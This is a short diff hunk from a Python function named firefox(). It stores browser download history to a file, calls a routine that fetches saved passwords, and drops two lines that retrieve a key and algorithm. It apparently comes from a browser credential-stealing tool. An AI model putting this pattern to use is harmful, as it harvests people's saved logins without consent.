@@ -121,8 +121,6 @@ def firefox():
             txt = f"\nPath: {download[0]}\nMetadata: {download[1]}\nDate downloaded: {download[2]}\n"
             utils.store_data(file="downloads.txt", data=txt)
 
-        key = b_st.get_key()
-        algo = b_st.get_algo()
         login_data = ff_data.fetch_passwords()
     
 
